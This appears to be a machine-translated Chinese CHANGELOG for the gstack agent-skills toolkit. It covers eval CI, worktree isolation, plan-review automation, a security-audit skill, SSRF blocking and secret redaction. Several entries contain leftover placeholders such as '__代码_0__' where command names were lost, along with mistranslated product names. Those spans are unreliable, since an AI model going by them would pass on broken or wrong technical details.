- `EVALS_FAST` / `FAST_EXCLUDED_TESTS` 被删除，取而代之的是 `EVALS_TIER`
- 从 CI 矩阵中删除 `allow_failure` （门测试应该可靠）
- 新的 `.github/workflows/evals-periodic.yml` 于周一上午 6 点（世界标准时间）运行定期测试
- 新迁移：`supabase/migrations/002_tighten_rls.sql`
- 新的冒烟测试：`supabase/verify-rls.sh`（9 个检查：5 次读取 + 4 次写入）
- 扩展 `test/telemetry.test.ts` 并进行字段名称验证
- 来自 git 的未跟踪的 `browse/dist/` 二进制文件（仅限 arm64，由 `./setup` 重建）

## [0.11.15.0] - 2026-03-24。计划审查和法典的端到端测试覆盖率

### 额外

- **E2E 测试验证计划审核报告出现在计划底部。** `/plan-eng-review` 审核报告现已进行端到端测试。如果它停止将 `## GSTACK REVIEW REPORT` 写入计划文件，测试会捕获它。
- **E2E 测试验证每个计划技能中都提供了 Codex。** 四项新的轻量级测试确认 `/office-hours`、`/plan-ceo-review`、`/plan-design-review` 和 `/plan-eng-review` 都会检查 Codex 可用性、提示用户并在 Codex 不可用时处理回退。

### 对于贡献者

- `test/skill-e2e-plan.test.ts` 中的新 E2E 测试：`plan-review-report`、`codex-offered-eng-review`、`codex-offered-ceo-review`、`codex-offered-office-hours`、`codex-offered-design-review`
- 更新了触摸文件映射和选择计数断言
- 将 `touchfiles` 添加到 CLAUDE.md 中记录的全局 touchfile 列表中

## [0.11.14.0] - 2026-03-24。 Windows 浏览修复

### 固定的

- **浏览引擎现在可以在 Windows 上运行。** 三个复合错误阻止了所有 Windows `/browse` 用户：当 CLI 退出时服务器进程死亡（Bun 的 `unref()` 在 Windows 上没有真正分离），健康检查从未运行，因为 `process.kill(pid, 0)` 在 Windows 上的 Bun 二进制文件中被破坏，并且 Chromium 的沙箱在通过 Bun→Node 进程链生成时失败。所有三个现在都已修复。感谢 @fqueiro (PR #191) 识别 `detached: true` 方法。
- **运行状况检查首先在所有平台上运行。** `ensureServer()` 现在会在回退到基于 PID 的检测之前尝试 HTTP 运行状况检查。在每个操作系统上都更加可靠，而不仅仅是 Windows。
- **启动错误记录到磁盘。** 当服务器无法启动时，错误将写入 `~/.gstack/browse-startup-error.log` ，以便 Windows 用户（由于进程分离而丢失 stderr）可以进行调试。
- **Windows 上禁用 Chromium 沙箱。** Chromium 沙箱在通过 Bun→Node 链生成时需要提升权限。现在仅在 Windows 上禁用。

### 对于贡献者

- `isServerHealthy()` 的新测试和 `browse/test/config.test.ts` 中的启动错误日志记录

## [0.11.13.0] - 2026-03-24。工作树隔离 + 基础设施优雅

### 额外

- **E2E 测试现在在 git worktrees 中运行。** Gemini 和 Codex 测试不再污染您的工作树。每个测试套件都有一个独立的工作树，AI 代理所做的有用更改会自动收集为您可以挑选的补丁。运行 `git apply ~/.gstack-dev/harvests/<id>/gemini.patch` 来获取改进。
- **收获重复数据删除。** 如果测试在运行过程中不断产生相同的改进，则会通过 SHA-256 哈希检测到并跳过。没有重复的补丁堆积。
- **`describeWithWorktree()` 帮助程序。** 任何 E2E 测试现在都可以选择使用单行包装器进行工作树隔离。未来需要真实存储库上下文（git 历史记录、真实差异）的测试可以使用它而不是 tmpdirs。

### 改变了

- **Gen-skill-docs 现在是一个模块化解析器管道。** 单片 1700 行生成器分为 8 个重点解析器模块（浏览、序言、设计、审查、测试、实用程序、常量、codex-helpers）。添加新的占位符解析器现在是单个文件，而不是编辑宏功能。
- **评估结果是项目范围内的。**结果现在位于 `~/.gstack/projects/$SLUG/evals/` 而不是全局 `~/.gstack-dev/evals/` 中。多项目用户不再将评估结果混合在一起。

### 对于贡献者

- WorktreeManager (`lib/worktree.ts`) 是一个可重用的平台模块。未来的技能如`/batch`可以直接导入。
- WorktreeManager 的 12 个新单元测试，涵盖生命周期、收获、重复数据删除和错误处理。
- `GLOBAL_TOUCHFILES` 已更新，因此工作树基础架构更改会触发所有 E2E 测试。

## [0.11.12.0] - 2026-03-24。三语音自动规划

现在，每个 `/autoplan` 阶段都会获得两个独立的第二意见。一份来自 Codex（OpenAI 的前沿模型），一份来自新的 Claude 子代理。三位人工智能审核员从不同角度审视您的计划，每个阶段都建立在最后一个阶段的基础上。

### 额外

- **每个自动计划阶段都有双重声音。** CEO 审查、设计审查和工程审查各自同时运行 Codex 挑战和独立的 Claude 子代理。您会得到一个共识表，显示模型同意和不同意的地方。分歧在最后一道门的品味决定中浮现出来。
- **阶段级联背景。** Codex 将前期研究结果作为背景（CEO 关注的问题通知设计审查，CEO+Design 通知工程师）。 Claude 子代理对于真正的跨模型验证保持真正的独立性。
- **结构化共识表。** CEO 阶段对 6 个战略维度进行评分，设计使用试金石记分卡，Eng 对 6 个架构维度进行评分。每项均已确认/DISAGREE。
- **跨阶段合成。** 第 4 阶段门突出了在多个阶段中独立出现的主题。当不同的审阅者发现同一问题时，就会发出高置信度信号。
- **顺序执行。** 阶段之间的停止标记 + 阶段前检查表可防止自动计划意外并行 CEO/Design/Eng （每个阶段都取决于前一个阶段）。
- **相变摘要。** 每个阶段边界的简要状态，以便您可以跟踪进度，而无需等待完整的管道。
- **降级矩阵。** 当 Codex 或 Claude 子代理失败时，自动计划会通过清晰的标签（`[codex-only]`、`[subagent-only]`、`[single-reviewer mode]`）优雅地降级。

## [0.11.11.0] - 2026-03-23。社区第 3 波

合并了 10 个社区 PR。错误修复、平台支持和工作流程改进。

### 额外

- **Chrome 多配置文件 cookie 导入。** 您现在可以从任何 Chrome 配置文件导入 cookie，而不仅仅是默认设置。个人资料选择器显示帐户电子邮件以便于识别。跨所有可见域批量导入。
- **Linux Chromium cookie 导入。** Cookie 导入现在适用于 Chrome、Chromium、Brave 和 Edge 的 Linux。支持 GNOME 密钥环 (libsecret) 和无头环境的“peanuts”后备。
- **浏览会话中的 Chrome 扩展程序。** 设置 `BROWSE_EXTENSIONS_DIR` 将 Chrome 扩展程序（广告拦截器、辅助工具、自定义标头）加载到浏览测试会话中。
- **项目范围的 gstack 安装。** `setup --local` 将 gstack 安装到当前项目的 `.claude/skills/` 中，而不是全局安装。对于每个项目的版本固定很有用。
- **分发管道检查。** `/office-hours`、`/plan-eng-review`、`/ship` 和 `/review` 现在检查新的 CLI 工具或库是否具有 build/publish 管道。不再有任何人可以下载的运输工件。
- **动态技能发现。** 添加新技能目录不再需要编辑硬编码列表。 `skill-check` 和 `gen-skill-docs` 自动从文件系统中发现技能。
- **自动触发防护。** 技能现在在其描述中包含明确的触发标准，以防止克劳德代码根据语义相似性自动触发它们。保留现有的主动建议系统。

### 固定的

- **浏览服务器启动崩溃。** 当 `.gstack/` 目录不存在时，浏览服务器锁定获取失败，导致每次调用都认为另一个进程持有锁定。通过在获取锁之前创建状态目录来修复。
- **技能序言中的 Zsh glob 错误。** 当不存在待处理文件时，遥测清理循环不再在 zsh 中抛出 _​​_CODE_0__ 。
- **`--force` 现在实际上强制升级。** `gstack-upgrade --force` 清除暂停文件，因此您可以在暂停后立即升级。
- **/review 范围漂移检测中的三点差异。**范围漂移分析现在可以正确显示自分支创建以来的更改，而不是基础分支上累积的更改。
- **CI 工作流程 YAML 解析。** 修复了破坏 YAML 解析的未加引号的多行 `run:` 标量。添加了 actionlint CI 工作流程。

### 社区

感谢@osc、@Explorer1092、@Qike-Li、@francoisaubert1、@itstimwhite、@yinanli1917-cloud 在这一波中的贡献。

## [0.11.10.0] - 2026-03-23。 Ubicloud 上的 CI 评估

### 额外

- **E2E 评估现在在每个 PR 上的 CI 中运行。** Ubicloud 上的 12 个并行 GitHub Actions 运行器在每个 PR 上旋转，每个运行一个测试套件。 Docker 镜像预烘焙了 Bun、节点、Claude CLI 和 deps，因此设置几乎是即时的。结果以公关评论形式发布，包含 pass/fail + 成本明细。
- **评估运行速度加快 3 倍。** 所有 E2E 测试通过 `testConcurrentIfSelected` 在文件内同时运行。挂钟从约 18 分钟缩短至约 6 分钟。受最慢的单个测试限制，而不是连续总和。
- **Docker CI 镜像** (`Dockerfile.ci`) 带有预安装的工具链。当 Dockerfile 或 package.json 更改时自动重建，并通过 GHCR 中的内容哈希进行缓存。

### 固定的

- **路由测试现在可以在 CI 中使用。** 技能安装在顶级 `.claude/skills/` 上，而不是嵌套在 `.claude/skills/gstack/` 下。项目级技能发现不会递归到子目录中。

### 对于贡献者

- CI 中的 `EVALS_CONCURRENCY=40` 可实现最大并行度（本地默认值保持在 15）
- Ubicloud 运行程序价格约为 0.006 美元/run（比 GitHub 标准运行程序便宜 10 倍）
- `workflow_dispatch` 手动重新运行触发器

## [0.11.9.0] - 2026-03-23。 Codex技能加载修复

### 固定的

- **Codex 不再拒绝带有“无效 SKILL.md”的 gstack 技能。** 现有安装具有过大的描述字段（>1024 个字符），Codex 会默默拒绝。如果任何 Codex 描述超过 1024 个字符，构建现在会出错，安装程序始终重新生成 `.agents/` 以防止过时的文件，并且一次性迁移会自动清除现有安装上过大的描述。
- **`package.json` 版本现在与 `VERSION` 保持同步。** 落后了 6 个小版本。新的 CI 测试可以捕捉未来的趋势。

### 额外

- **Codex E2E 测试现在断言没有技能加载错误。** 促使此修复的确切“跳过加载技能”错误现在是回归测试。 `stderr` 被捕获并检查。
- **自述文件中的 Codex 故障排除条目。** 针对在自动迁移运行之前遇到加载错误的用户的手动修复说明。

### 对于贡献者

- `test/gen-skill-docs.test.ts` 验证所有 `.agents/` 描述是否在 1024 个字符以内
- `gstack-update-check` 包括一次性迁移，可删除超大的 Codex SKILL.md 文件
- P1 TODO添加：Codex→克劳德反向好友检查技能

## [0.11.8.0] - 2026-03-23。 zsh 兼容性修复

### 固定的

- **gstack 技能现在可以在 zsh 中正常工作，不会出现错误。** 每个技能前导码都使用 `.pending-*` glob 模式，该模式会在每次调用时触发 zsh 的“未找到匹配项”错误（不存在挂起的遥测文件的常见情况）。将 shell glob 替换为 `find` 以完全避免 zsh 的 NOMATCH 行为。感谢 @hnshah 的初步报告和 PR #332 中的修复。修复#313。

### 额外

- **zsh glob 安全性回归测试。** 新测试验证所有生成的 SKILL.md 文件使用 `find` 而不是裸外壳 glob 进行 `.pending-*` 模式匹配。

## [0.11.7.0] - 2026-03-23。 /review → /ship 切换修复

### 固定的

- **`/review` 现在满足船舶就绪门的要求。** 以前，在 `/ship` 之前运行 `/review` 总是显示“未清除”，因为 `/review` 没有记录其结果，而 `/ship` 仅查找 `/plan-eng-review`。现在，`/review` 将其结果保留到审核日志中，并且所有仪表板都将 `/review`（差异范围）和 `/plan-eng-review`（计划阶段）识别为有效的工程审核源。
- **发货中止提示现在提到了两个审核选项。** 当工程审核缺失时，`/ship` 建议“运行 `/review` 或 `/plan-eng-review`”，而不是仅提及 `/plan-eng-review`。

### 对于贡献者

- 基于 @malikrohail 的 PR #338。每个工程审查的 DRY 改进：更新了共享的 `REVIEW_DASHBOARD` 解析器，而不是创建重复的仅发货解析器。
- 4 个新的验证测试，涵盖审查日志持久性、仪表板传播和中止文本。

## [0.11.6.0] - 2026-03-23。基础设施优先的安全审计

### 额外

- **`/cso` v2。从违规实际发生的地方开始。**安全审核现在从您的基础设施攻击面开始（git 历史记录中泄露的秘密、依赖项 CVE、CI/CD 管道配置错误、未经验证的 Webhook、Dockerfile 安全性），然后再触及应用程序代码。 15个阶段，涵盖秘密考古、供应链、CI/CD、LLM/AI安全、技能供应链、OWASP Top 10、STRIDE和主动验证。
- **两种审核模式。** `--daily` 使用 8/10 置信度门运行零噪声扫描（仅报告其高度自信的结果）。 `--comprehensive` 使用 2/10 条进行每月深度扫描（显示所有值得研究的内容）。
- **主动验证。** 每个发现在报告前都会由子代理进行独立验证。不再需要 grep 和猜测。变体分析：当确认一个漏洞时，将在整个代码库中搜索相同的模式。
- **趋势跟踪。** 对审计结果进行指纹识别并进行跟踪。您可以查看新增内容、已修复内容以及已忽略的内容。
- **差异范围审核。** `--diff` 模式将审核范围限定为您的分支与基础分支上的更改。非常适合合并前安全检查。
- **3 个 E2E 测试**，其中包含植入的漏洞（硬编码 API 密钥、跟踪的 `.env` 文件、未签名的 Webhooks、未固定的 GitHub Actions、无根 Dockerfile）。全部验证通过。

### 改变了

- **扫描前进行堆栈检测。** v1 在每个项目上运行 Ruby/Java/PHP/C# 模式，而不检查堆栈。 v2 首先检测您的框架并优先考虑相关检查。
- **正确的工具使用。** v1 在 Bash 中使用原始 `grep` ； v2 使用 Claude Code 的本机 `Grep` 工具来获得可靠的结果而无需截断。

## [0.11.5.2] - 2026-03-22。外部声音

### 额外

- **计划审查现在提供独立的第二意见。** 在 `/plan-ceo-review` 或 `/plan-eng-review` 中完成所有审查部分后，您可以从不同的 AI 模型（Codex CLI，或者如果未安装 Codex，则为新的 Claude 子代理）获得“残酷诚实的外部声音”。它会读取您的计划，找出审核中遗漏的内容。逻辑差距、未阐明的假设、可行性风险。并逐字介绍调查结果。可选，推荐，永不阻塞运输。
- **跨模型张力检测。** 当外部声音不同意审查结果时，分歧会自动浮出水面并作为 TODO 提供，因此不会丢失任何内容。
- **审核准备仪表板中的外部声音。** `/ship` 现在显示外部声音是否在计划中运行，以及现有的 CEO/Eng/Design/Adversarial 审核行。

### 改变了

- **`/plan-eng-review` Codex 集成已升级。** 旧的硬编码 Step 0.5 被更丰富的解析器所取代，该解析器添加了 Claude 子代理回退、审查日志持久性、仪表板可见性和更高的推理工作量 (`xhigh`)。

## [0.11.5.1] - 2026-03-23。在线办公时间

### 改变了

- **/office-hours 不再需要“打开另一个窗口”。** 当 `/plan-ceo-review` 或 `/plan-eng-review` 提议先运行 `/office-hours` 时，它现在会在同一对话中内联运行。设计文档准备好后，审查将从中断处继续。当您仍在弄清楚要构建什么时，会话中检测也是如此。
- **移交注释基础设施已删除。** 不再编写桥接旧的“转到另一个窗口”流程的移交注释。为了向后兼容，仍会阅读先前会议的现有笔记。

## [0.11.5.0] - 2026-03-23。 Bash 兼容性修复

### 固定的

- **`gstack-review-read` 和 `gstack-review-log` 在 bash 下不再崩溃。** 这些脚本使用 `source <(gstack-slug)` ，它无法在 bash 下使用 `set -euo pipefail` 设置变量，从而导致 `SLUG: unbound variable` 错误。替换为 `eval "$(gstack-slug)"` ，它在 bash 和 zsh 中都能正常工作。
- **更新了所有 SKILL.md 模板。** 每个指示代理运行 `source <(gstack-slug)` 的模板现在都使用 `eval "$(gstack-slug)"` 来实现跨 shell 兼容性。从模板重新生成所有 SKILL.md 文件。
- **添加了回归测试。** 新测试验证 `eval "$(gstack-slug)"` 在 bash 严格模式下工作，并防止 `source <(.*gstack-slug` 模式在模板或 bin 脚本中重新出现。

## [0.11.4.0] - 2026-03-22。办公时间法典

### 额外

- **您的头脑风暴现在得到了第二意见。** 在 `/office-hours` 中的前提挑战之后，您可以选择参加 Codex 冷读。一个完全独立的人工智能，没有看到对话，会审查你的问题、答案和前提。它会验证你的想法，找出你所说的最具启发性的话，挑战一个前提，并提出一个 48 小时的原型。两种不同的人工智能模型看到不同的事物时会发现盲点，这两种模型单独使用都不会发现盲点。
- **设计文档中的跨模型视角。** 当您使用第二意见时，设计文档会自动包含一个 `## Cross-Model Perspective` 部分，捕获 Codex 所说的内容。因此，独立观点将被保留以供下游审查。
- **新的创始人信号：用推理来捍卫前提。** 当 Codex 挑战你的前提之一并且你用明确的推理（不仅仅是驳回）来维持它时，这将被视为一种积极的信念信号。

## [0.11.3.0] - 2026-03-23。设计外部声音

### 额外

- **现在每个设计审查都会获得第二意见。** `/plan-design-review`、`/design-review` 和 `/design-consultation` 并行调度 Codex (OpenAI) 和新的 Claude 子代理来独立评估您的设计。然后用石蕊记分卡综合结果，显示他们同意和不同意的地方。跨模型一致性=高置信度；分歧=调查。
- **OpenAI 的设计硬规则已融入。** 7 个硬拒绝标准、7 个试金石检查以及来自 OpenAI 的“设计令人愉悦的前端”框架的登陆页面与应用程序 UI 分类器。与 gstack 现有的 10 项 AI slop 黑名单合并。您的设计将根据 OpenAI 为其自己的模型推荐的相同规则进行评估。
- **每个 PR 中都有 Codex 设计声音。** 在 `/ship` 和 `/review` 中运行的轻量级设计审查现在包括前端文件更改时的 Codex 设计检查。自动，无需选择加入。
- **/office-hours 头脑风暴中的外部声音。** 绘制线框草图后，您现在可以在确定方向之前获得 Codex + Claude 子代理对您的方法的设计观点。
- **AI slop 黑名单提取为共享常量。** 10 种反模式（紫色渐变、3 列图标网格、居中所有内容等）现在定义一次并在所有设计技能之间共享。更容易维护，不会漂移。

## [0.11.2.0] - 2026-03-22。食典有效

### 固定的

- **Codex 在启动时不再显示“超过 1024 个字符的最大长度”。** 技能描述从约 1,200 个单词压缩到约 280 个单词。远低于限制。现在每个技能都有一个强制上限的测试。
- **不再有重复的技能发现。** Codex 用于查找源 SKILL.md 文件和生成的 Codex 技能，将每个技能显示两次。安装程序现在在 `~/.codex/skills/gstack` 处创建一个最小运行时根目录，仅包含 Codex 所需的资源。没有暴露源文件。
- **旧的直接安装自动迁移。** 如果您之前将 gstack 克隆到 `~/.codex/skills/gstack`，安装程序会检测到这一点并将其移动到 `~/.gstack/repos/gstack`，这样就不会从源签出中发现技能。
- **Sidecar 目录不再作为技能链接。** `.agents/skills/gstack` 运行时资产目录与实际技能错误地符号链接。现在跳过了。

### 额外

- **存储库本地 Codex 安装。** 将 gstack 克隆到任何存储库内的 `.agents/skills/gstack` 并运行 `./setup --host codex`。技能安装在结帐旁边，不需要全局 `~/.codex/`。生成的前导码会在运行时自动检测是否使用存储库本地路径或全局路径。
- **Kiro CLI 支持。** `./setup --host kiro` 安装 Kiro 代理平台的技能、重写路径和符号链接运行时资产。如果安装了 `kiro-cli`，则由 `--host auto` 自动检测。
- **`.agents/` 现在已被 gitignored。** 不再提交生成的 Codex 技能文件。它们是在设置时根据模板创建的。从存储库中删除 14,000 多行生成的输出。

### 改变了

- **`GSTACK_DIR` 在整个安装脚本中重命名为 `SOURCE_GSTACK_DIR` / `INSTALL_GSTACK_DIR`** ，以便清楚地了解哪个路径指向源存储库与安装位置。
- **CI 验证 Codex 生成是否成功**，而不是检查提交的文件新鲜度（因为 `.agents/` 不再提交）。

## [0.11.1.1] - 2026-03-22。计划文件始终显示审核状态

### 额外

- **每个计划文件现在都显示审核状态。** 当您退出计划模式时，计划文件会自动获取 `GSTACK REVIEW REPORT` 部分。即使您尚未进行任何正式审查。以前，此部分仅在运行 `/plan-eng-review`、`/plan-ceo-review`、`/plan-design-review` 或 `/codex review` 后出现。现在，您始终知道自己的立场：哪些评论已运行，哪些尚未运行，以及下一步该做什么。

## [0.11.1.0] - 2026-03-22。全球回顾：跨项目人工智能编码回顾

### 额外

- **__代码_0__。在一份报告中查看您在每个项目中发送的所有内容。** 扫描您的 Claude Code、Codex CLI 和 Gemini CLI 会话，将每个会话追溯到其 git 存储库，通过远程删除重复项，然后对所有这些会话运行完整的追溯。全球运输记录、上下文切换指标、个人贡献的每个项目细分以及跨工具使用模式。运行 `/retro global 14d` 查看两周视图。
- **全球回顾中每个项目的个人贡献。** 全球回顾中的每个项目现在都会显示您的提交、LOC、关键工作、提交类型组合和最大的船舶。与团队总数分开。单独项目说“单独项目。所有提交都是你的。”您未接触过的团队项目仅显示会话计数。
- **__代码_0__。全局复古背后的引擎。** 独立发现脚本，可查找计算机上的所有 AI 编码会话，将工作目录解析为 git 存储库，标准化 SSH/HTTPS 远程设备以进行重复数据删除，并输出结构化 JSON。编译后的二进制文件随 gstack 一起发布。不需要 `bun` 运行时。

### 固定的

- **发现脚本仅读取会话文件的前几 KB**，而不是将整个多 MB JSONL 转录本加载到内存中。防止具有丰富编码历史的机器上的 OOM。
- **Claude Code 会话计数现在是准确的。** 之前对项目目录中的所有 JSONL 文件进行了计数；现在只计算在时间窗口内修改的文件。
- **周窗口（`1w`、`2w`）现在像日窗口一样与午夜对齐**，因此 `/retro global 1w` 和 `/retro global 7d` 会产生一致的结果。

## [0.11.0.0] - 2026-03-22。 /cso：零噪音安全审计

### 额外

- **__代码_0__。您的首席安全官。** 完整的代码库安全审计：OWASP Top 10、STRIDE 威胁建模、攻击面映射、数据分类和依赖性扫描。每个发现都包括严重性、置信度得分、具体的利用场景和补救选项。不是短绒棉。威胁模型。
- **零噪声误报过滤。** 17 个硬排除和 9 个先例改编自 Anthropic 的安全审查方法。 DOS 不是一个发现。测试文件不是攻击面。 React 默认是 XSS 安全的。每项发现的置信度必须达到 8/10 以上才能撰写报告。结果：3 个真实发现，而不是 3 个真实结果 + 12 个理论结果。
- **独立发现验证。** 每个候选发现均由新的子代理验证，该子代理仅查看发现和误报规则。初始扫描没有锚定偏差。未通过独立验证的调查结果将被悄悄丢弃。
- **`browse storage` 现在自动编辑机密。** 通过键名称和值前缀检测令牌、JWT、API 密钥、GitHub PAT 和承载令牌。您看到的是 `[REDACTED. 42 chars]` 而不是秘密。
- **Azure 元数据端点被阻止。** `browse goto` 的 SSRF 保护现在涵盖所有三个主要云提供商（AWS、GCP、Azure）。

### 固定的

- **`gstack-slug` 针对 shell 注入进行了强化。** 输出仅清理为字母数字、点、破折号和下划线。所有剩余的 `eval $(gstack-slug)` 调用者都迁移到 `source <(...)`。
- **DNS 重新绑定保护。** `browse goto` 现在将主机名解析为 IP 并检查元数据阻止列表。防止域最初解析为安全 IP，然后切换到云元数据端点的攻击。
- **并发服务器启动竞争已修复。** 独占锁定文件可防止两个 CLI 调用同时终止旧服务器并启动新服务器，这可能会留下孤立的 Chromium 进程。
- **更智能的存储编辑。** 键匹配现在使用下划线感知边界（在 `keyboardShortcuts` 或 `monkeyPatch` 上不会出现误报）。值检测扩展到涵盖 AWS、Stripe、Anthropic、Google、Sendgrid 和 Supabase 键前缀。
- **CI 工作流程 YAML lint 错误已修复。**

### 对于贡献者

- **社区公关分类流程记录在 CONTRIBUTING.md 中**。
- **存储编辑测试覆盖率。** 用于基于键和基于值的检测的四个新测试。

## [0.10.2.0] - 2026-03-22。自动规划深度修复

### 固定的

- **`/autoplan` 现在生成全面深入的评论，而不是将所有内容压缩为一行行。** 当 autoplan 说“自动决定”时，它的意思是“使用原则为用户做出决定”。但特工将其解释为“完全跳过分析”。现在自动计划明确定义了契约：自动决定取代了你的判断，而不是分析。每个评论部分仍然会被阅读、图表化和评估。您可以获得与手动运行每个审核相同的深度。
- **CEO 和 Eng 阶段的执行清单。** 每个阶段现在都准确地列举了必须生产的内容。前提挑战、架构图、测试覆盖图、故障注册表、磁盘上的工件。不再需要“全深度跟踪该文件”而不说明“全深度”的含义。
- **门前验证捕获跳过的输出。** 在提出最终批准门之前，自动计划现在检查所需输出的具体清单。丢失的物品会在门打开之前生成（最多重试 2 次，然后发出警告）。
- **测试评审永远不能被跳过。** 工程评审的测试图部分。最高价值的产出。被明确标记为“从不跳过或压缩”，并包含读取实际差异、将每个代码路径映射到覆盖范围以及编写测试计划工件的指令。

## [0.10.1.0] - 2026-03-22。测试覆盖率目录

### 额外

- **测试覆盖率审计现在可以在任何地方使用。计划、交付和审查。** 代码路径跟踪方法（ASCII 图、质量评分、差距检测）通过单个 `{{TEST_COVERAGE_AUDIT}}` 解析器在 `/plan-eng-review`、`/ship` 和 `/review` 之间共享。计划模式在编写代码之前将缺少的测试添加到您的计划中。运输模式自动生成间隙测试。审核模式在着陆前审核期间查找未经测试的路径。一种方法，三种上下文，零复制粘贴。
- **`/review` 步骤 4.75。测试覆盖图。** 在登陆代码之前，`/review` 现在会跟踪每个更改的代码路径并生成一个 ASCII 覆盖图，显示已测试的内容 (★★★/★★/★) 和未测试的内容 (GAP)。差距成为遵循“修复优先”流程的信息性发现。您可以在那里生成缺少的测试。
- **内置 E2E 测试建议。** 覆盖率审核知道何时推荐 E2E 测试（常见用户流程、单元测试无法覆盖的棘手集成）与单元测试，并标记需要评估覆盖率的 LLM 提示更改。不再猜测某些东西是否需要集成测试。
- **回归检测铁律。** 当代码更改修改现有行为时，gstack 始终会编写回归测试。不询问，不跳过。如果你改变了它，你就测试它。
- **`/ship` 故障分类。** 当测试在运输过程中失败时，覆盖率审核会对每个故障进行分类并建议后续步骤，而不仅仅是转储错误输出。
- **测试框架自动检测。** 首先读取 CLAUDE.md 中的测试命令，然后从项目文件（package.json、Gemfile、pyproject.toml 等）中自动检测。适用于任何框架。

### 固定的

- **gstack 不再在没有 `origin` 遥控器的存储库中崩溃。** `gstack-repo-mode` 帮助程序现在可以优雅地处理丢失的遥控器、裸存储库和空 git 输出。默认为 `unknown` 模式而不是使前导码崩溃。
- **`REPO_MODE` 当助手不发出任何信号时默认正确。** 以前，来自 `gstack-repo-mode` 的空响应未设置 `REPO_MODE` ，导致下游模板错误。

## [0.10.0.0] - 2026-03-22。自动计划

### 额外

- **__代码_0__。一个命令，全面审查计划。** 交给它一个粗略的计划，它会自动运行完整的 CEO → 设计 → 工程审查流程。从磁盘读取实际的审阅技能文件（与手动运行每个审阅相同的深度、相同的严格性），并使用 6 个编码原则做出中间决策：完整性、沸腾湖、务实、干燥、明确而非聪明、偏向于行动。口味决定（接近方法、边界范围、法典分歧）在最终批准关口浮出水面。您批准、推翻、询问或修改。保存还原点，以便您可以从头开始重新运行。写入与 `/ship` 的仪表板兼容的审核日志。

## [0.9.8.0] - 2026-03-21。部署管道+端到端性能

### 额外

- **__代码_0__。在一个命令中合并、部署和验证。** 接管 `/ship` 中断的地方。合并 PR，等待 CI 和部署工作流程，然后对您的生产 URL 运行金丝雀验证。自动检测您的部署平台（Fly.io、Render、Vercel、Netlify、Heroku、GitHub Actions）。在每个故障点提供恢复。从“PR 批准”到“在生产中验证”的一条命令。
- **__代码_0__。部署后监控循环。** 使用浏览守护进程监视实时应用程序的控制台错误、性能下降和页面故障。定期进行屏幕截图，与部署前的基线进行比较，并对异常情况发出警报。任何部署后运行 `/canary https://myapp.com --duration 10m` 。
- **__代码_0__。性能回归检测。** 建立页面加载时间、核心 Web 生命和资源大小的基线。比较每个 PR 上的 before/after。跟踪一段时间内的性能趋势。捕获代码审查遗漏的包大小回归。
- **__代码_0__。一次性部署配置。** 检测您的部署平台、生产 URL、运行状况检查端点和部署状态命令。将配置写入 CLAUDE.md，以便将来所有 `/land-and-deploy` 运行都是全自动的。
- **`/review` 现在包括性能和捆绑包影响分析。** 信息审查通过检查严重依赖性、缺少延迟加载、同步脚本标记和捆绑包大小回归。在发布之前捕获 moment.js-instead-of-date-fns。

### 改变了

- **E2E 测试现在运行速度提高了 3-5 倍。** 结构测试默认为 Sonnet（速度提高 5 倍，成本降低 5 倍）。质量测试（植入错误检测、设计质量、战略审查）保留在 Opus 上。全套时间从 50-80 分钟减少到约 15-25 分钟。
- **`--retry 2` 在所有 E2E 测试中。** 不稳定的测试获得第二次机会，而不会掩盖真正的失败。
- **`test:e2e:fast` 层。** 排除 8 个最慢的 Opus 质量测试，以实现快速反馈（约 5-7 分钟）。运行 `bun run test:e2e:fast` 进行快速迭代。
- **E2E 定时遥测。** 现在每个测试都会记录使用的 `first_response_ms`、`max_inter_turn_ms` 和 `model`。挂钟计时显示并行性是否真正起作用。

### 固定的

- **`plan-design-review-plan-mode` 不再竞争。** 每个测试都有自己独立的 tmpdir。不再有并发测试污染彼此的工作目录。
- **`ship-local-workflow` 不再浪费 15 轮中的 6 轮。** 船舶工作流程步骤内联在测试提示中，而不是让代理在运行时读取 700 多行 SKILL.md。
- **`design-consultation-core` 不再在同义词部分失败。**“颜色”匹配“颜色”，“类型系统”匹配“版式”。仍需要所有 7 个部分的基于模糊同义词的匹配。

## [0.9.7.0] - 2026-03-21。计划文件审查报告

### 额外

- **每个计划文件现在都会显示已运行的审查。** 任何审查技能完成后（`/plan-ceo-review`、`/plan-eng-review`、`/plan-design-review`、`/codex review`），一个降价表将附加到计划文件本身。显示每个审核的触发命令、目的、运行计数、状态和结果摘要。任何阅读该计划的人都可以一目了然地看到审核状态，而无需检查对话历史记录。
- **审核日志现在捕获更丰富的数据。** CEO 审核日志范围提案计数（提议的/accepted/deferred），工程审核记录发现的总问题，设计审核记录评分之前→之后的情况，法典审核记录修复了多少发现。计划文件报告直接使用这些字段。不再根据部分元数据进行猜测。

## [0.9.6.0] - 2026-03-21。自动缩放的对抗性审查

### 改变了

- **审查彻底性现在会根据差异大小自动缩放。** 小差异（<50 行）完全跳过对抗性审查。不会浪费时间修复拼写错误。中等差异（50-199行）从Codex（如果未安装Codex，则为Claude对抗子代理）获得跨模型对抗性挑战。大差异（200 多行）获得所有四个通过：Claude 结构化、带有 pass/fail 门的 Codex 结构化审查、Claude 对抗性子代理和 Codex 对抗性挑战。无需配置。它就是有效的。
- **Claude 现在有对抗模式。** 一个没有清单偏见的新 Claude 子代理会像攻击者一样审查您的代码。发现结构化审查可能遗漏的边缘情况、竞争条件、安全漏洞和静默数据损坏。结果分为“可修复”（自动修复）或“调查”（您的决定）。
- **审查仪表板显示“对抗”而不是“法典审查”。**仪表板行反映了新的多模型现实。它跟踪实际运行的任何对抗性通行证，而不仅仅是 Codex。

## [0.9.5.0] - 2026-03-21。建设者精神

### 额外

- **ETHOS.md。 gstack 的构建者哲学在一份文档中。** 四个原则：黄金时代（AI 压缩比）、Boil the Lake（完整性很便宜）、构建前搜索（三层知识）和为自己构建。这是每个工作流程技能都引用的哲学真理来源。
- **现在，每个工作流程技能都会在推荐之前进行搜索。** 在建议基础架构模式、并发方法或特定于框架的解决方案之前，gstack 会检查运行时是否具有内置功能以及该模式是否是当前的最佳实践。三层知识。经过验证的（第 1 层）、新颖流行的（第 2 层）和第一原则（第 3 层）。最有价值的见解最为珍贵。
- **尤里卡时刻。** 当第一原理推理揭示传统智慧是错误的时，gstack 会命名它、庆祝它并记录它。您的每周 `/retro` 现在会显示这些见解，以便您可以看到您的项目在哪里变化，而其他项目在哪里变化。
- **`/office-hours` 增加了景观意识阶段。** 在通过提问了解你的问题之后，但在挑战前提之前，gstack 会搜索世界的想法。然后运行三层综合，找出传统观点对于您的具体情况可能错误的地方。
